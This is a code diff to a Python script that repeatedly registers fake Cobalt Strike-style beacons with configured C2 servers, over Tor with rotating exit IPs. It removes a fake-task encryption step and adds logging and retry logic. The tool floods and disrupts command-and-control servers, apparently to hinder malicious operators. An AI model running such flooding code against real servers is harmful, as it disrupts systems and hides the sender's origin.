@@ -131,47 +131,18 @@ def register_beacon(conf, cnt):
             req = tor_session.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
         else:
             req = requests.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
+        print('[Response code: ' + str(req.status_code) + ']')
+        print('[' + str(cnt.value()) + '] Beacon registered')
+
     except Exception as e:
         print('[-] Got exception from server: %s' % e)
+        if tor_session != None:
+            spam_utils.renew_tor_ip()
         return
 
-    # This is how to properly encrypt a task:
-    # Tasks are encrypted with the session's aes key, decided and negotiated when we registered the beacon (it's part of the metadata)
-    ## Here is where you'll build a proper task struct ##
-    random_data = os.urandom(50)
-    # session counter = 1
-    data = struct.pack('>II', 1, len(random_data)) + random_data
-    pad_size = AES.block_size - len(data) % AES.block_size
-    data = data + pad_size * b'\x00'
-
-    # encrypt the task data and wrap with hmac sig and encrypted data length
-    cipher = AES.new(m.aes_key, AES.MODE_CBC, CS_FIXED_IV)
-    enc_data = cipher.encrypt(data)
-    sig = hmac.new(m.hmac_key, enc_data, HASH_ALGO).digest()[0:16]
-    enc_data += sig
-    enc_data = struct.pack('>I', len(enc_data)) + enc_data
-
-    # task data is POSTed so we need to take the transformation steps of http-post.client
-    t = Transform(conf['HttpPost_Metadata'])
-    body, headers, params = t.encode(m.pack().decode('latin-1'), enc_data.decode('latin-1'), str(m.bid))
-
-    if ( 'HostHeader' in conf):
-        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
-        if domain :
-            headers['Host'] = domain.group(1).strip()
-
-    #print('[' + str(cnt.value()) + '] Sending task data')
-
-    try:
-        if tor_session != None:
-            req = tor_session.request('POST', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['HttpPostUri'].split(',')[0]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
-        else:
-            req = requests.request('POST', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['HttpPostUri'].split(',')[0]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
-        print('[Response code: ' + str(req.status_code) + ']')
-        cnt.increment()
-        print('[' + str(cnt.value()) + '] Task sent')
-    except Exception as e:
-        print('[-] Got exception from server while sending task: %s' % e)
+    # Increment the number of beacons even if it was not successful since the problem might be a faulty Tor exit node
+    # and changing Tor IP won't be initiated if the number of beacons sent does not change
+    cnt.increment()
 
     if tor_session != None:
         if cnt.value() % tor_ip_renew_interval == 0:
@@ -184,7 +155,7 @@ def spam(confs, cnt):
     while (1==1):
         for c in confs:
             register_beacon(c, cnt)
-            
+#            print("Value: " + str(cnt.value()))
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
